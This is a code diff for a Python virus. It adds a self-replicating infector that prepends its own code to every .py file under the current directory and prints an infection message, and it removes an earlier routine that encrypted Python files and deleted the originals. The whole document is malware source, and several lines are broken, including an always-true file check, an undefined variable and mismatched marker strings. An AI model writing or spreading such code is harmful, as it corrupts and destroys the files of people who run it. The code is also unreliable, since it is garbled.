@@ -1,14 +1,52 @@
+#VIRUS SAYS HI!
+
 import os, glob, sys
 
-def searchEncFile(path):
+def infectPy(path):
+    virus_code = []
+    with open(sys.argv[0], 'r', encoding='utf-8') as  f:
+        lines = f.readlines()
+
+        self_replication_part = False
+        for line in lines:
+            if line=="#VIRUS SAYS HI!":
+                self_replication_part = True
+            if not self_replication_part:
+                virus_code.append(line)
+            if line == "#VIRUS SAYS BYE!\n":
+                break
+
     for filename in glob.iglob(path, recursive = True):
         if os.path.isfile(filename):
-            if ".py" in filename:
-                print('Encrypting> ' + filename) # 파일명 출력
-                aesEnc.makeEncInfo(filename)
-                aesEnc.enc(filename) # Encrypt_file에 위에서 선언한 키값과 파일명을 인자로 호출
-                os.remove(filename) # 현재파일을 제거 (encrypt_file 함수에서 새파일을 작성하였기에 기존파일을 제거해야함.)
-        elif os.path.isdir(filename):
-            searchEncFile(filename + '\\*')
+            if ".py" or ".pyw" in filename:
+                with open(file, 'r') as f:
+                    file_code = f.readlines()
 
-def infect(filename):
+                infected = False
+
+                for line in file_code:
+                    if line == "# VIRUS SAYS HI!\n":
+                        infected = True
+                        break
+
+                if not infected:
+                    final_code = []
+                    final_code.extend(virus_code)
+                    final_code.extend('\n')
+                    final_code.extend(file_code)
+
+                    with open(file, 'w') as f:
+                        f.writelines(final_code)
+
+        elif os.path.isdir(filename):
+            infectPy(filename + "\\*")
+
+def malicious_code():
+    print("YOU HAVE BEEN INFECTED!")
+
+path = "./"
+
+infectPy(path)
+malicious_code()
+
+#VIRUS SAYS BYE!
